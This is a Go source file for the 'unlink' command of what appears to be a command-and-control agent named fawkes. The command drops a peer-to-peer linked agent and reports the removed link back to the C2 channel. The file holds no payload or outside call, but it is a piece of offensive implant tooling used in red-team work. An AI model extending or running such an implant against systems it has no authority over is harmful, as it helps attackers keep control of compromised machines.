package commands

import (
	"encoding/json"

	"fawkes/pkg/structs"
)

type UnlinkCommand struct{}

func (c *UnlinkCommand) Name() string {
	return "unlink"
}

func (c *UnlinkCommand) Description() string {
	return "Disconnect a linked P2P agent (TCP or named pipe)"
}

type unlinkArgs struct {
	ConnectionID string `json:"connection_id"` // UUID of the linked agent to disconnect
}

func (c *UnlinkCommand) Execute(task structs.Task) structs.CommandResult {
	var args unlinkArgs
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return errorf("Failed to parse parameters: %v", err)
		}
	}

	if args.ConnectionID == "" {
		return errorResult("connection_id is required (UUID of the linked agent)")
	}

	if tcpProfileInstance == nil {
		return errorResult("TCP P2P not available — agent was not built with TCP profile support")
	}

	// Remove the child connection
	tcpProfileInstance.RemoveChildConnection(args.ConnectionID)

	// Send edge removal notification
	tcpProfileInstance.EdgeMessages <- structs.P2PConnectionMessage{
		Source:        tcpProfileInstance.GetCallbackUUID(),
		Destination:   args.ConnectionID,
		Action:        "remove",
		C2ProfileName: "tcp",
	}

	shortUUID := args.ConnectionID
	if len(shortUUID) > 8 {
		shortUUID = shortUUID[:8]
	}

	return successf("Successfully unlinked agent %s", shortUUID)
}
